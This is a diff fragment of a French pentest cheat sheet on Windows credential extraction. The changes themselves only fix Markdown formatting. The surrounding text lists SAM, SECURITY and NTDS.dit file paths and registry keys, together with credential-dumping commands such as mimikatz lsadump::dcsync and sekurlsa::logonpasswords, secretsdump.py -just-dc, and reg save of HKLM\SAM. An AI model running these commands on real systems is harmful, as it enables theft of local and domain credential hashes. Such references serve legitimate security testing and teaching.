@@ -5,8 +5,9 @@ Fichiers Critiques : SAM, SYSTEM, SECURITY & NTDS.dit
 |  SAM | C:\Windows\System32\config\SAM | Stocke les hashs NTLM des comptes locaux | samdump2, mimikatz, secretsdump.py  |
 |  SYSTEM | C:\Windows\System32\config\SYSTEM | Contient la clé de chiffrement pour décrypter SAM | reg save, secretsdump.py -system SYSTEM -sam SAM LOCAL  |
 |  SECURITY | C:\Windows\System32\config\SECURITY | Stocke les secrets LSA (mots de passe de services, clés DPAPI) + cred des users de domaine | mimikatz lsadump::secrets, secretsdump.py -security SECURITY LOCAL  |
-|  NTDS.dit (DC) | C:\Windows\NTDS\NTDS.dit | Base de données Active Directory, contient les hashs NTLM & Kerberos de tout le domaine | ntdsutil, secretsdump.py -just-dc, mimikatz lsadump::dcsync  |
-Techniques d'extraction Machine Membre d'un Domaine :
+|  NTDS.dit (DC) | C:\Windows\NTDS\NTDS.dit | Base de données Active Directory, contient les hashs NTLM & Kerberos de tout le domaine | ntdsutil, secretsdump.py -just-dc, mimikatz lsadump::dcsync  
+
+## Techniques d'extraction Machine Membre d'un Domaine :
 - Dump de SAM et SYSTEM pour obtenir les hash NTLM locaux :
   ```powershell
   reg save HKLM\SAM C:\temp\SAM.hive
@@ -40,8 +41,8 @@ Contrôleur de Domaine (DC) :
 | :--: | :--: | :--: | :--: |
 | AutoLogon | HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon | Nom d'utilisateur et mot de passe en clair si AutoLogon activé | reg query, mimikatz sekurlsa::logonpasswords |
 | MSCache | HKLM\SECURITY\Cache | Hashs NTLM en cache pour connexions horsligne | mimikatz lsadump::cache, secretsdump.py security SECURITY LOCAL |
-| RDP Credentials | HKCU\Software\Microsoft\Terminal Server Client\Servers | Identifiants stockés pour sessions RDP | reg query, mimikatz sekurlsa::credman |
-Techniques d'extraction
+| RDP Credentials | HKCU\Software\Microsoft\Terminal Server Client\Servers | Identifiants stockés pour sessions RDP | reg query, mimikatz sekurlsa::credman
+##Techniques d'extraction
 - Lister les credentials RDP enregistrés :
   ```powershell
   reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
